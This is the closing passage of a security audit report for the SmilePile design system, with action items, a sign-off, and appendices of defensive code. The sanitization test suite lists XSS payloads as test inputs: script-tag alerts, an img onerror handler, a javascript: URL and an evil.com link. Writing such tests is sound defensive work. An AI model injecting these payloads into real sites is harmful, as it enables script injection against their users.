- Privacy compliance achieved (GDPR/COPPA)

---

### Critical Action Items (MUST DO)

1. ✅ **Self-host Atkinson Hyperlegible fonts** (all platforms)
   - Eliminates: MITM risk, Google tracking, GDPR/COPPA issues
   - Effort: 2-4 hours
   - Priority: **CRITICAL**

2. ✅ **Implement Content Security Policy** (website)
   - Prevents: XSS, clickjacking, unauthorized resource loading
   - Effort: 2 hours
   - Priority: **CRITICAL**

3. ✅ **Kids Mode external resource audit**
   - Ensures: COPPA compliance (no data collection from children)
   - Effort: 1 hour
   - Priority: **CRITICAL**

---

### Recommended Action Items (SHOULD DO)

4. ✅ **Sanitize all component props** (website)
   - Prevents: XSS, ARIA injection, CSS injection
   - Effort: 4-6 hours
   - Priority: **HIGH**

5. ✅ **Implement automated security testing**
   - Catches: Vulnerabilities in CI/CD pipeline
   - Effort: 4-6 hours
   - Priority: **HIGH**

6. ✅ **Validate dark mode contrast ratios**
   - Ensures: WCAG compliance, prevents phishing
   - Effort: 2 hours
   - Priority: **MEDIUM**

---

### Optional Action Items (NICE TO HAVE)

7. ⚠️ **Font integrity verification** (iOS/Android)
   - Detects: Tampered font files on jailbroken/rooted devices
   - Effort: 2 hours
   - Priority: **LOW**

8. ⚠️ **Animated focus indicators**
   - Prevents: Fake focus indicator phishing
   - Effort: 1 hour
   - Priority: **LOW**

---

### Sign-Off

This security audit identifies **2 Critical**, **3 High**, **4 Medium**, and **3 Low** risk findings in the Design System implementation plans. **All Critical and High risks MUST be mitigated before implementation proceeds.**

**Recommended Timeline**:
- Phase 1 (Critical Security): **Complete BEFORE starting implementation**
- Phase 2-3 (Validation & Accessibility): **During implementation**
- Phase 4-5 (Testing): **Before deployment to production**

**Total Security Effort**: 20-30 hours (in addition to 216-hour implementation)

**Approval Required From**:
- [ ] Security Lead
- [ ] Privacy Officer (GDPR/COPPA compliance)
- [ ] Product Manager (sign-off on self-hosted fonts)
- [ ] Development Team (review feasibility)

---

**Document Status**: DRAFT - PENDING APPROVAL
**Next Review**: After Phase 1 mitigation implementation
**Contact**: Atlas Security Agent

---

## Appendix A: Security Testing Scripts

### A.1 Font Integrity Verification (iOS)

```swift
import CryptoKit
import Foundation

extension Data {
    var sha256Hash: String {
        let hashed = SHA256.hash(data: self)
        return hashed.compactMap { String(format: "%02x", $0) }.joined()
    }
}

func verifyFontIntegrity(fontName: String, expectedHash: String) -> Bool {
    guard let fontURL = Bundle.main.url(forResource: fontName, withExtension: "ttf"),
          let fontData = try? Data(contentsOf: fontURL) else {
        print("❌ Font file not found: \(fontName)")
        return false
    }

    let actualHash = fontData.sha256Hash

    if actualHash != expectedHash {
        print("⚠️ Font integrity check FAILED!")
        print("   Font: \(fontName)")
        print("   Expected: \(expectedHash)")
        print("   Actual: \(actualHash)")
        return false
    }

    print("✅ Font integrity verified: \(fontName)")
    return true
}

// Usage in FontManager.swift
let fontHashes = [
    "AtkinsonHyperlegible-Regular": "abc123...",
    "AtkinsonHyperlegible-Bold": "def456..."
]

for (fontName, expectedHash) in fontHashes {
    guard verifyFontIntegrity(fontName: fontName, expectedHash: expectedHash) else {
        // Use system font fallback
        print("⚠️ Using system font fallback")
        continue
    }
    // Proceed with font registration
}
```

### A.2 CSP Report Endpoint (Website)

```typescript
// pages/api/csp-reports.ts
import type { APIRoute } from 'astro';

export const POST: APIRoute = async ({ request }) => {
  try {
    const report = await request.json();

    // Log CSP violation
    console.error('CSP Violation:', {
      documentUri: report['document-uri'],
      violatedDirective: report['violated-directive'],
      blockedUri: report['blocked-uri'],
      originalPolicy: report['original-policy']
    });

    // TODO: Send to monitoring service (Sentry, LogRocket, etc.)

    return new Response(null, { status: 204 });
  } catch (error) {
    console.error('CSP report parsing error:', error);
    return new Response(null, { status: 400 });
  }
};
```

### A.3 Sanitization Test Suite (Website)

```typescript
// tests/sanitize.test.ts
import { describe, it, expect } from 'vitest';
import { sanitizeHTML, sanitizeColor, sanitizeARIA } from '../src/utils/sanitize';

describe('Sanitization', () => {
  describe('sanitizeHTML', () => {
    it('should strip script tags', () => {
      const input = 'Hello<script>alert("XSS")</script>World';
      expect(sanitizeHTML(input)).toBe('HelloWorld');
    });

    it('should strip HTML tags', () => {
      const input = '<b>Bold</b> text';
      expect(sanitizeHTML(input)).toBe('Bold text');
    });

    it('should handle malicious attributes', () => {
      const input = '<img src=x onerror=alert("XSS")>';
      expect(sanitizeHTML(input)).toBe('');
    });
  });

  describe('sanitizeColor', () => {
    it('should accept valid hex colors', () => {
      expect(sanitizeColor('#7FB3D5')).toBe('#7FB3D5');
      expect(sanitizeColor('#fff')).toBe('#fff');
    });

    it('should reject invalid hex colors', () => {
      expect(sanitizeColor('red')).toBe('#7FB3D5'); // Default
      expect(sanitizeColor('rgb(255,0,0)')).toBe('#7FB3D5');
      expect(sanitizeColor('javascript:alert(1)')).toBe('#7FB3D5');
    });
  });

  describe('sanitizeARIA', () => {
    it('should strip HTML from ARIA labels', () => {
      const input = 'Click <a href="evil.com">here</a>';
      expect(sanitizeARIA(input)).toBe('Click here');
    });

    it('should remove script tags', () => {
      const input = 'Button<script>alert("XSS")</script>';
      expect(sanitizeARIA(input)).toBe('Button');
    });
  });
});
```

---

## Appendix B: Security Resources

### External Security Tools

- **WebAIM Contrast Checker**: https://webaim.org/resources/contrastchecker/
- **WAVE Browser Extension**: https://wave.webaim.org/extension/
- **Axe DevTools**: https://www.deque.com/axe/devtools/
- **pa11y**: https://pa11y.org/
- **CSP Evaluator**: https://csp-evaluator.withgoogle.com/
- **SecurityHeaders.com**: https://securityheaders.com/
- **VirusTotal**: https://www.virustotal.com/ (font file scanning)

### Font Resources

- **Atkinson Hyperlegible GitHub**: https://github.com/googlefonts/atkinson-hyperlegible
- **Braille Institute**: https://brailleinstitute.org/freefont
- **SIL OFL License**: https://scripts.sil.org/OFL

### Security Standards

- **WCAG 2.2**: https://www.w3.org/WAI/WCAG22/quickref/
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **GDPR**: https://gdpr.eu/
- **COPPA**: https://www.ftc.gov/enforcement/rules/rulemaking-regulatory-reform-proceedings/childrens-online-privacy-protection-rule

### SmilePile-Specific Documentation

- **Security Checklist**: `/Users/adamstack/SmilePile/.atlas/security-checklist.md`
- **Conventions**: `/Users/adamstack/SmilePile/.atlas/conventions.md`
- **Design System**: `/Users/adamstack/SmilePile/website/DESIGN_SYSTEM.md`

---

**End of Security Audit Report**
